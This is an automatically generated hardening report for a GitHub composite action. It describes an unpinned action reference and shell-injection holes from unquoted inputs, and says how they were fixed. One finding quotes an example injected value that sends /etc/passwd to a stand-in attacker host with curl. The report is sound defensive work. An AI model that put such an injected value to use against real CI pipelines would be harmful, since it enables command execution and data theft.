<!-- markdownlint-disable -->

# Hardening Report: rjtngit--nunit-html-action/v2.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **rjtngit--nunit-html-action/v2.0.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

action.yml references actions/setup-python@v6, which is a mutable tag rather than a pinned 40-character commit SHA. This means the action could silently change to a different (potentially malicious) version without any notice. It should be pinned to a full SHA, e.g. actions/setup-python@<40-char-sha> # v6.

Locations:

- `action.yml:14`

### script-injection (severity: high)

The run: block in action.yml directly interpolates GitHub Actions expressions into shell commands (sub-rule a). Three expressions are injected: (1) `${{ github.action_path }}` — while not attacker-controlled, it is still a template expression that flows through YAML substitution before the shell sees it; (2) `${{ inputs.inputXmlPath }}` — fully attacker-controlled input injected as a positional shell argument without quoting or sanitization, allowing arbitrary command injection; (3) `${{ inputs.outputHtmlPath }}` — same issue. An attacker calling this composite action can supply a value like `; curl -d @/etc/passwd https://evil.com` as inputXmlPath to execute arbitrary commands. All three expressions must be moved to env: variables and the shell expansions must be double-quoted (e.g. "$INPUT_XML_PATH").

Locations:

- `action.yml:18`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.inputXmlPath }}" appears directly in run: block of step "Run python script"; move to env: map

Locations:

- `action.yml:22`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.outputHtmlPath }}" appears directly in run: block of step "Run python script"; move to env: map

Locations:

- `action.yml:22`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

1. Pinned actions/setup-python@v6 to full SHA a309ff8b426b58ec0e2a45f0f869d46889d02405 with # v6 comment. 2. Moved all three ${{ }} expressions (github.action_path, inputs.inputXmlPath, inputs.outputHtmlPath) from the run: block into an env: map as ACTION_PATH, INPUT_XML_PATH, and OUTPUT_HTML_PATH respectively. 3. In the shell script, all variables are double-quoted; the optional OUTPUT_HTML_PATH uses ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"} to avoid passing an empty positional argument when the input is not provided.

